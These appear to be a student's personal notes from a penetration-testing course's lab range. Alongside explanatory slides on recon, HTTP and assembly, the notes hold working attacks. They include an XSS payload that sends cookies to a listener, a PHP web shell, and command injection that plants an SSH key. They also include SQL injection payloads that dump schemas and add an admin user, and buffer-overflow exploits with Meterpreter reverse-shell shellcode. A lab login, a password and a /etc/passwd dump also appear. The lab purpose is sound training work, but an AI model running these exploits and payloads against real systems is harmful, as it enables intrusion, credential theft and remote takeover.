-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Stack Number	Username	  Password 	          jump
6 	          JAKU-007-M 	bDKNK32Forgxo4C    	10.50.27.90
                                              literally just run ping here
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
PENTEST
Phases
_________________
Mission definition
Recon
Footprinting
Exploitation + Initial Access
Post-Exploitation
Document Mission
Penetration Test Reporting
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
VULNERABILITY AND EXPLOITATION RESEARCH

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
SCANNING AND RECONNASISSANCE
Data to Collect

    Web Data

    Sensitive Data

    Publicly Accessible

    Social Media

    Domain and IP Data

Hyper-Text Markup Language (HTML)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Standardized markup language for browser interpretation of webpages


    Client-side interpretation (web browser)

    Utilizes elements (identified by tags)

    Typically redirects to another page for server-side interaction

    Cascading Stylesheets (CSS) for page themeing
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
HTML

DEMO: Simple HTML page


http://10.50.XX.XX/webexample/htmldemo.html
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Scraping Data script and prep

pip install lxml requests

#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Advanced Scanning Techniques

    Host Discovery

        Find hosts that are online

    Port Enumeration

        Find ports for each host that is online
    Port Interrogation

        Find what service is running on each open/available port
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
192.168.28.96/27
192.168.150.224/27
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
NMAP Scripting Engine

During the lesson we will review the following topics:


    Benefits of Scanning with Scripts

    Script Management and Utilization

    Usage and Examples
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Main Benefits (of NMAP Scripts)

    Network Discovery

    Sophisticated Version Detection

    Vulnerability Detection

    Backdoor Detection

    Vulnerability Exploitation
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Script Management

Scripts are stored in a subdirectory of the Nmap data directory by default:


/usr/share/nmap/scripts
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Usage and Examples

nmap --script <filename>|<category>|<directory>
nmap --script-help "ftp-* and discovery"
nmap --script-args <args>
nmap --script-args-file <filename>
nmap --script-help <filename>|<category>|<directory>
nmap --script-trace
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
email addresses go in notes
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
HTTP Methods

A Select Few:

    GET

    POST

    HEAD

    PUT


https://tools.ietf.org/html/rfc2616
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
HTTP Response Codes

    10X == Informational

    2XX == Success

    30X == Redirection

    4XX == Client Error

    5XX == Server Error


https://tools.ietf.org/html/rfc2616
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Wget

    Recursively download

    Recover from broken transfers

    SSL/TLS support
wget -r -l2 -P /tmp ftp://ftpserver/
wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
wget --load-cookies cookies.txt -p https://website/interesting/article.php
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
cURL

    Not recursive

    Can use pipes

    Upload ability

    Supports more protocols vs Wget, such as SCP & POP3

curl -o stuff.html https://web.site/stuff.html
curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
JavaScript (JS)

    Allows websites to interact with the client

        JavaScript runs on the client’s machine

    Coded as .js files, or in-line of HTML
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
JS Interaction

<script>
function myFunction() {
    document.getElementById("demo").innerHTML = "Paragraph changed.";
}
</script>

<script src="https://www.w3schools.com/js/myScript1.js"></script>
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Enumeration

    Robots.txt

    Legitimate surfing

    Tools:

        NSE scripts

        Nikto

        Burp suite (outside class)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Cross-Site Scripting (XSS) Overview

    Insertion of arbitrary code into a webpage, that executes in the browser of visitors

    Unsanitized GET, POST, and PUT methods allow JS to be placed on websites

    Often found in forums that allow HTML
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Reflected XSS

    Most common form of XSS

    Transient, occurs in error messages or search results

    Delivered through intermediate media, such as a link in an email

    Characters that are normally illegal in URLs can be Base64 encoded


Below is what you see, but the server will decode as name=abc123


http://example.com/page.php?name=dXNlcjEyMw
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Stored XSS

    Resides on vulnerable site

    Only requires user to visit page


<img src="http://invalid" onerror="window.open('http://10.50.31.213:8000/ram.png','xss','height=1,width=1');">
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Useful JavaScript Components

Proof of concept (simple alert):

<script>alert('XSS');</script>

    Capturing Cookies
    document.cookie

    Capturing Keystrokes

        bind keydown and keyup

    Capturing Sensitive Data
    document.body.innerHTML
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
RETRIEVE COOKIES
<script>document.location="http://10.50.31.213:8000/"+document.cookie;</script>

python3 -m http.server
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Server-Side injection

Directory Traversal/Path Traversal


    Ability to read/execute outside web server’s directory

    Uses ../../ (relative paths) in manipulating a server-side file path

note that 'file=' is IMMEDIATELY proceeded by ../../../
view_image.php?file=../../etc/passwd
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Malicious File Upload

Site allows unsanitized file uploads


    Server doesn’t validate extension or size

    Allows for code execution (shell)

    Once uploaded

        Find your file

        Call your file
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Command Injection

Application on the server is vulnerable,
allowing execution of arbitrary commands


    User input not validated

        Common example is a SOHO router, with a web page to allow ping


Might contain the following in it’s code:

system("ping -c 1 ".$_GET["ip"]);


Run the following to chain/stack our arbitrary command

Injections
; cat /etc/passwd
; <command>

If shit allows command injection because no input validation: 
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
(web server)  ;mkdir /var/www/.ssh                <- You've just created an ssh config file for the www-data account (or whatever account you're on)
lin-ops> ssh-keygen -t rsa -b 4096                <- You've just created an ssh key for yourself(Hit enter when it asks for specifications)
lin-ops> cat <public key>
copy+paste the entire contents into the web server with a quote at the start
then add to the end ' >>/var/www/.ssh/authorized_keys'
ssh 
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
SMB finder scripty - --script=smb-os-discovery
Or some shit -   . .     -
               \     /
                ||
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
SQL Injection - Considerations

    Requires Valid SQL Queries

    Fully patched systems can be vulnerable due to misconfiguration

    Input Field Sanitization

    String vs Integer Values

    Is information_schema Database available?

    GET Request versus POST Request HTTP methods
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Unsanitized vs Sanitized Fields

Unsanitized: input fields can be found using a Single Quote ⇒ '


    Will return extraneous information

    ' closes a variable, to allow for additional statements/clauses

    May show no errors or generic error (harder Injection)


Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)


Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Server-Side Query Processing

User enters JohnDoe243 in the name form field and pass1234 in the pass form field.


The Server-Side Query that would be passed to MySQL from PHP would be:


BEFORE INPUT:

SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;


AFTER INPUT:

SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Example - Injecting Your Statement

User enters tom' OR 1='1 in the name and pass fields.


Truth Statement: tom ' OR 1='1


Server-Side query executed would appear like this:


SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
##Golden Statement
UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
              <column>     <column>    <column>       <database>.        <table>
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Once on sql server:
sql server> mysql
MariaDB [(none)]> show databases ;
MariaDB [(none)]> use information_schema ;
MariaDB [(information_schema)]> show tables from information_schema ;
MariaDB [(information_schema)]> show columns from columns ;
MariaDB [(information_schema)]> select table_schema from information_schema.colums ;
MariaDB [(information_schema)]> select table_name from information_schema.columns ;
MariaDB [(information_schema)]> select column_name from information_schema.columns ;
MariaDB [(information_schema)]> select table_schema,table_name,column_name from information_schema.columns
MariaDB [(information_schema)]> select name,cost,year from session.car
                                  <column><column><column>  <database>.<table>
Audi ' UNION SELECT Db,2,Host,User,5 FROM mysql.db #

Audi ' UNION SELECT PLUGIN_NAME,PLUGIN_VERSION FROM information_schema.ALL_PLUGINS #'
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Information_Schema
  Tables
    Columns

Table Schema has all the data bases
Table name has the names of all the tables in all the data bases
Column name has all the names of all the colmns in the all the data bases
' OR 1='1
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Post Edition SQL injection
Audi ' UNION SELECT 1,2,3,4 #' <- Do this to see how many fields the request wants. Increment until it triggers

## Modify golden statement to include all information
UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #                     <- add buffer numbers (2 and 5) so that the golden statement will run

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Get edition SQL injection
CREVjLhhneaXcpyHZ7W9
##Identify Vulnerable field 
?Selection=4 OR 1=1

##Identift Number of columns
?Selection=3 UNION SELECT 1,2,3

##DISPLAY table is out of order

## GOLDEN STATEMENT FROM BEFORE
UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Accountname', 'AccountLname', 'User', 'Pass', 'email', 3) 

John', 'field1', 'field2', 1) --(
John', 'field1', 'field2', 1)
John', 'field1', 'field2', 3) INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'lastin', 'userin', 'passin', 'emailin', 1) --

John' INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'lastin', 'userin', 'passin', 'emailin', 1)' 

TABLE NAMES SQL FLAGS
sqlinjection- categories, members, orderlines, orders,payments,permissions,products,share4

CREVjLhhneaXcpyHZ7W9
admin@website.com

categories - id, name, description
members- id, username, password, first_name, last_name, email, permission
products - id, name, description, price, qty_left, category
share4 - id, comment, mime, data
payments - id,creditcard_number,date,order
orders- id,date,member
orderlines- id, quantity, product, order


APPLICABLE_ROLES - GRANTEE, ROLE_NAME, IS_GRANTABLE, IS_DEFAULT




permissions	id
permissions	level
permissions	name
permissions	description
products	id
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Optic-100-Silver' UNION SELECT GRANTEE,ROLE_NAME FROM information_schema.columns#'

Optic-100-Silver' UNION SELECT table_schema,table_name FROM information_schema.columns #'
Optic-100-Silver' UNION SELECT table_name,column_name FROM information_schema.columns #'     <- Shows table name and column name
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
X86_64 Assembly

There are 16 general purpose 64-Bit registers


%rax
	

the first return register

%rbp
	

the base pointer that keeps track of the base of the stack

%rsp
	

the stack pointer that points to the top of the stack


You will see arguments passed to functions as something like:

[%ebp-0x8]
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
X86_64 Assembly - Common Terms

Heap
	

Memory that can be allocated and deallocated

Stack
	

A contiguous section of memory used for passing arguments

General Register
	

A multipurpose register that can be used by either programmer or user to store data or a memory location address

Control Register
	

A processor register that changes or controls the behavior of a CPU

Flags Register
	

Contains the current state of the processor
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
X86_64 Assembly - Memory Offset

There is one instruction pointer register that points to the memory offset of the next instruction in the code segment:


64-Bit	Lower 32 bits	Lower 16 bits	Descrition

RIP
	

EIP
	

IP
	

Instruction Pointer; holds address for next instruction to be executed
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
X86_64 Assembly - Common Instruction Pointers

MOV
	

move source to destination

PUSH
	

push source onto stack

POP
	

Pop top of stack to destination

INC
	

Increment source by 1

DEC
	

Decrement source by 1

ADD
	

Add source to destination

SUB
	

Subtract source from destination

CMP
	

Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.

JMP
	

Jump to specified location

JLE
	

Jump if less than or equal

JE
	

Jump if equal
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Reverse Engineering Workflow (Software)

    Static

    Behavioral

    Dynamic

    Disassembly

    Document Findings


Reverse Engineering Workflow
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Portable Executable Patching / Software Analysis

    Perform Debugging and Disassembly

    Find the Success/Failure

    Adjust Instructions

    Apply Patch and Save

    Execute Patched Binary
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Buffer Overflow Defenses

    Non executable (NX) stack

    Address Space Layout Randomization (ASLR)

    Data Execution Prevention (DEP)

    Stack Canaries

    Position Independent Executable (PIE)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Technical Help

Utilizing tools such as:


    IDA, GHIDRA

    GDB, MONA, IMMUNITY

    BASH, PYTHON
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
GDB Uses
Installation of Peda Plugin

git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

Common Commands

disass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
gdb <file>
run <<< ($python <self-made-script-for-buffer-overflow>)
disass main
disass <any function>
env - gdb func
show env
unset env <variable>              <- remove em all
crash that shiiii
info proc map
							  jump	esp

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
msfvenom -p linux/x86/exec CMD=ls -l -b '\x00' -f python
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
self-made-buffer-overflow-script

buffer = "A" * 62
#wompwomp eip = "BBBB"
eip = "\x59\x3b\xde\xf7"
buf =  b""
buf += b"\xbb\x64\xfd\xfe\x03\xda\xc6\xd9\x74\x24\xf4\x5a"
buf += b"\x33\xc9\xb1\x0b\x31\x5a\x14\x83\xc2\x04\x03\x5a"
buf += b"\x10\x86\x08\x94\x08\x1e\x6a\x3b\x69\xf6\xa1\xdf"
buf += b"\xfc\xe1\xd2\x30\x8c\x85\x22\x27\x5d\x37\x4a\xd9"
buf += b"\x28\x54\xde\xcd\x2c\x9a\xdf\x0d\x44\xf2\xb0\x6c"
buf += b"\xc7\x6b\x4f\x38\x44\xe2\xae\x0b\xea"
#0xf7de3b59 -> pythonism -> "\xf7\xde\x3b\x59"	-> First in last out for heap -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> pythonism -> "\xf7\xf5\x88\xab"	-> First in last out for heap -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> pythonism -> "\xf7\xf6\x45\xfb"	-> First in last out for heap -> "\xfb\x45\xf6\xf7"
nop = '\x90' * 5
print(buffer + eip + nop + buf)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
buffer = "A" * 62
#wompwomp eip = "BBBB"
eip = "\x59\x3b\xde\xf7"
buf =  b""
buf =  b""
buf += b"\xb8\x67\x6b\x6d\x1a\xdb\xcd\xd9\x74\x24\xf4\x5b"
buf += b"\x33\xc9\xb1\x0d\x31\x43\x15\x83\xc3\x04\x03\x43"
buf += b"\x11\xe2\x92\x01\x66\x42\xc5\x84\x1e\x1a\xd8\x4b"
buf += b"\x56\x3d\x4a\xa3\x1b\xaa\x8a\xd3\xf4\x48\xe3\x4d"
buf += b"\x82\x6e\xa1\x79\x84\x70\x45\x7a\xc6\x11\x31\x5a"
buf += b"\x27\xb7\xcd\xf9\x18\x47\x4c\x8d\x15\xd0\xea\x71"
buf += b"\x8d\x4d\x7b\x90\xfc\xf2"
#0xf7de3b59 -> pythonism -> "\xf7\xde\x3b\x59"	-> First in last out for heap -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> pythonism -> "\xf7\xf5\x88\xab"	-> First in last out for heap -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> pythonism -> "\xf7\xf6\x45\xfb"	-> First in last out for heap -> "\xfb\x45\xf6\xf7"
nop = '\x90' * 5
print(buffer + eip + nop + buf)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
buf =  b""
buf += b"\xda\xd3\xd9\x74\x24\xf4\xba\x1e\xda\x0b\xd5\x5d"
buf += b"\x2b\xc9\xb1\x0b\x31\x55\x19\x83\xed\xfc\x03\x55"
buf += b"\x15\xfc\x2f\x61\xde\x58\x49\x24\x86\x30\x44\xaa"
buf += b"\xcf\x27\xfe\x03\xa3\xcf\xff\x33\x6c\x6d\x69\xaa"
buf += b"\xfb\x92\x3b\xda\xfb\x54\xbc\x1a\x73\x3c\xd3\x7b"
buf += b"\x16\xd5\x2b\x2b\xbb\xac\xcd\x1e\xbb"
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
0xf7f66533

\x33\x65\xf6\xf7
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
strings <vulnerable app>
netstat -ant (find the port from strings)

#!/usr/bin/env python

import socket

buf = "TRUN /.:/"
buf += "A" * 5000

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## Creating socket, IPv4 TCP
s.connect (("10.50.33.77",9999)) #Define host and port
print s.recv(1024) ## Print to screen the response
s.send(buf) ## Send variable buf
print s.recv(1024) ## Print to screen the response
s.close() ## Close the socket
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
copy EIP to wiremask into find the offset to get the offset value
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Verify with BBBB that you are aiming in the right spot
EIP should be 42424242 or BBBB

#!/usr/bin/env python

import socket

buf = "TRUN /.:/"
#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1A$
buf += "A" * 2003
buf += "BBBB"
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## Creating socket, IPv4 TCP
s.connect (("10.50.33.77",9999)) #Define host and port
print s.recv(1024) ## Print to screen the response
s.send(buf) ## Send variable buf
print s.recv(1024) ## Print to screen the response
s.close() ## Close the socket

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
!mona modules 
!mona jmp -r esp -m "essfunc.dll"
		     ^^^^^^^^^^^ dll that the app is referencing
*switch to window 2*

These go in the debugger
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Make the hex block for the end of the variable buf
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.31.213 lport=4444 -b "\x00" -f python
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Set up a listener on Linops and sending the payload downrange

Linops> msfconsole
msf6> use multi/handler
msf6 exploit(multi/handler)> show options
msf6 exploit(multi/handler)> set payload windows/meterpreter/reverse_tcp
msf6> set LHOST 0.0.0.0
msf6> set LPORT 4444
msf6> exploit

*should say something like : Started reverse TCP handler on 0.0.0.0:4444*


linops> ./<script>



*should say:* 
Sending stage (175686 bytes) to 10.50.33.77
[*] Meterpreter session 11 opened (192.168.65.20:4444 -> 10.50.33.77:3144) at 2024-12-02 15:37:37 +0000

meterpreter >

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#!/usr/bin/env python

import socket

buf = "TRUN /.:/"
#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac$
buf += "A" * 2003
#buf += "BBBB"
buf += "\xa0\x12\x50\x62"
buf += "\x90" * 15
buf += b"\xd9\xce\xbd\x1b\x89\x17\x70\xd9\x74\x24\xf4\x5b"
buf += b"\x31\xc9\xb1\x59\x31\x6b\x19\x83\xeb\xfc\x03\x6b"
buf += b"\x15\xf9\x7c\xeb\x98\x72\x7e\x14\x59\xec\xf6\xf1"
buf += b"\x68\x3e\x6c\x71\xd8\x8e\xe6\xd7\xd1\x65\xaa\xc3"
buf += b"\xe6\xce\x01\xca\xc9\xcf\x1d\x60\x02\x1e\xe2\x29"
buf += b"\x6e\x01\x9e\x33\xa3\xe1\x9f\xfb\xb6\xe0\xd8\x4d"
buf += b"\xbc\x0d\xb4\xc6\x6c\xc1\xb2\x9b\xac\xe0\x14\x90"
buf += b"\x8d\x9a\xc3\x22\xcd\x2e\xa0\x2d\x1e\x45\x70\x36"
buf += b"\x15\x01\xa1\x47\xfa\xe1\x24\x8e\x88\x3d\x6e\x20"
buf += b"\x8e\xb6\x44\xc9\x71\x1e\x95\x0d\xdd\x5f\x19\x80"
buf += b"\x1f\x98\x9e\x7b\x6a\xd2\xdc\x06\x6d\x21\x9e\xdc"
buf += b"\xf8\xb5\x38\x96\x5b\x11\xb8\x7b\x3d\xd2\xb6\x30"
buf += b"\x49\xbc\xda\xc7\x9e\xb7\xe7\x4c\x21\x17\x6e\x16"
buf += b"\x06\xb3\x2a\xcc\x27\xe2\x96\xa3\x58\xf4\x7f\x1b"
buf += b"\xfd\x7f\x6d\x4a\x81\x80\x6d\x73\xdf\x16\xa1\xbe"
buf += b"\xe0\xe6\xad\xc9\x93\xd4\x72\x62\x3c\x54\xfa\xac"
buf += b"\xbb\xed\xec\x4e\x13\x55\x7c\xb1\x94\xa5\x54\x76"
buf += b"\xc0\xf5\xce\x5f\x69\x9e\x0e\x5f\xbc\x0a\x05\xf7"
buf += b"\x35\xf8\x06\xd2\x22\xfe\x38\xcd\xee\x77\xde\xbd"
buf += b"\x5e\xd7\x4f\x7e\x0f\x97\x3f\x16\x45\x18\x1f\x06"
buf += b"\x66\xf3\x08\xad\x89\xad\x61\x5a\x33\xf4\xfa\xfb"
buf += b"\xbc\x23\x87\x3c\x36\xc1\x77\xf2\xbf\xa0\x6b\xe3"
buf += b"\xa7\x4a\x74\xf4\x4d\x4a\x1e\xf0\xc7\x1d\xb6\xfa"
buf += b"\x3e\x69\x19\x04\x15\xea\x5e\xfa\xe8\xda\x15\xcd"
buf += b"\x7e\x62\x42\x32\x6f\x62\x92\x64\xe5\x62\xfa\xd0"
buf += b"\x5d\x31\x1f\x1f\x48\x26\x8c\x8a\x73\x1e\x60\x1c"
buf += b"\x1c\x9c\x5f\x6a\x83\x5f\x8a\xe8\xc4\x9f\x48\xc7"
buf += b"\x6c\xf7\xb2\x57\x8d\x07\xd9\x57\xdd\x6f\x16\x77"
buf += b"\xd2\x5f\xd7\x52\xbb\xf7\x52\x33\x09\x66\x62\x1e"
buf += b"\xcf\x36\x63\xad\xd4\xc9\x1e\xde\xeb\x2a\xdf\xf6"
buf += b"\x8f\x2b\xdf\xf6\xb1\x10\x09\xcf\xc7\x57\x89\x74"
buf += b"\xd7\xe2\xac\xdd\x72\x0c\xe2\x1e\x57"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## Creating socket, IP$
s.connect (("10.50.33.77",9999)) #Define host and port
print s.recv(1024) ## Print to screen the response
s.send(buf) ## Send variable buf
print s.recv(1024) ## Print to screen the response
s.close() ## Close the socket


## Little Extra Note Space n Shit For the Notes and Not for the Hoes but also$
## 625012A0 -> "\xA0\x12\x50\x62"
## msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.31.213 lport=4444 -b "\x00" -f python

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
STOLEN KEY WILL BE IN A TAR FILE DONT UNZIP THAT HOE

chmod 600 /home/student/stolenkey
ssh -i /home/student/stolenkey jane@1.2.3.4
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Host enumeration
net user <- Windows

cat /etc/passwd <- Linux
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Process Enumeration
tasklist /v <- Windows

ps -elf <- Linux
htop
top
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Service enumeration
chkconfig		 <-Windows
systemctl --type=service <-Linux
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Network connection enumeration
ipconfig /all
ifconfig -a
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#Tunnel
#Dynamic forward
#ping sweep
#port forward
# scp <source> <destination>
#scp local file to remote host
scp -P1212 file.sh student@127.0.0.1:/home/student2/Documents
scp -P1212 file.sh student@127.0.0.1 <- would send it to student's home dir
#scp file "script.sh" FROM remote host to local pwd
scp -P1212 student@127.0.0.1:/home/student2/Documents/script.sh .
#Windows edition scp
scp -P1212 file.sh student@127.0.0.1:C:/users/student/desktop

scp -P1212 student@127.0.0.1:C:/users/student/desktop/script.sh .
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------extra/intra/internal-----------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
